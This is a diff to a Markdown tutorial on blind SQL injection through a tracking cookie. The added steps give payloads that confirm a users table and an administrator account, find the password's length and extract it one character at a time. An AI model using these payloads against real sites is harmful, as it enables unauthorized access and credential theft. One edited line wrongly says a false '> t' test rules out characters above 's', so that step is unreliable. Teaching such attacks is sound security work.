@@ -17,21 +17,35 @@ Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='2
 ```
 - The first of these values causes the query to return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed.
 - The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
+## Example Exploit
+Another example, suppose you want to find out if the `users` table does exists and if there is a user account called `Administrator`.
+1. You can do this by sending the following input:
+```txt
+...xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+```
+Verify that the condition is true, confirming that there is a table called `users`.
+2. Now we can change the payload to:
+```txt
+...xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+```
+Verify that the condition is true, confirming that there is a user called `administrator`.
+## Example Exploit Continuation
+You can also use this technique to find out the password of the user called `administrator` by sending a series of inputs to test the password length:
+```txt
+...xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
+```
+When the condition stops being true (i.e when the "Welcome back" message disappears), we have determined the length of the password.
 
-Another example, suppose you want to find out the password of a user called Administrator. You can do this by sending a series of inputs to test the password one character at a time.
-
-You can start with the following input:
+1. We can now then do use the same technique to find out the password one character at a time:
 ```txt
 ...xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
 ```
-This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`. 
-
-Next send the following input:
+Verify that the condition is true, confirming that the first password character is greater than `m`.
+2.Next send the following input:
 ```txt
 ...xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
 ```
-This does not return the "Welcome back", indicating that the injected condition is false, and so the first character is not greater than `t`.
-
+Verify that the condition is not true, confirming that the first password character is not greater than `s`.
 Eventually, the following input returns a "Welcome back" message, thereby confirming that the first character is `s`:
 ```txt
 ...xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
